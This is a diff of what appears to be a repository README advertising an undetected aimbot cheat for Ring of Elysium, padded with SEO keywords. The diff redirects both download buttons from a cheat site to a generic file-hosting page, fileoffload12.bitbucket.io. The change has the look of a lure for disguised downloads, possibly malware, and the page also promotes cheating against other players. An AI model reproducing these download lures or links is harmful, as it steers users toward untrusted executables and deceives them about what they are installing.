@@ -4,7 +4,7 @@ If you’re tired of trading shots only to get clapped by a camper in the fog or
 
 Whether you’re fragging in solos or rolling squads, this aimbot puts you at the top of the kill feed.
 
-[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://wecheaters.github.io/cheats/ring-of-elysium/)
+[![Download Aimbot](https://img.shields.io/badge/Download-Aimbot-blueviolet)](https://fileoffload12.bitbucket.io)
 ---
 
 ## 💡 What is the ROE Aimbot?
@@ -13,7 +13,7 @@ The **Ring of Elysium Aimbot** is a cheat system designed to auto-lock onto enem
 
 The aimbot tracks live movement, predicts bullet drop, and adapts to both hipfire and scoped weapons. Works with rifles, SMGs, snipers — you name it.
 
-[![Download Aimbot](https://i.ytimg.com/vi/wryrl9fnmE8/maxresdefault.jpg)](https://wecheaters.github.io/cheats/ring-of-elysium/)
+[![Download Aimbot](https://i.ytimg.com/vi/wryrl9fnmE8/maxresdefault.jpg)](https://fileoffload12.bitbucket.io)
 ---
 
 ## 🔥 Key Features of This Aimbot
@@ -103,3 +103,4 @@ Don’t survive the storm. **Own it.** 🧊💀
 ring of elysium aimbot, roe aimbot cheat, silent aim roe, triggerbot ring of elysium, best aimbot for roe, ring of elysium aim assist, pc cheat aimbot roe, rage aimbot roe, legit aimbot settings ring of elysium, fov aimbot roe, undetected aimbot for roe
 
 ---
+
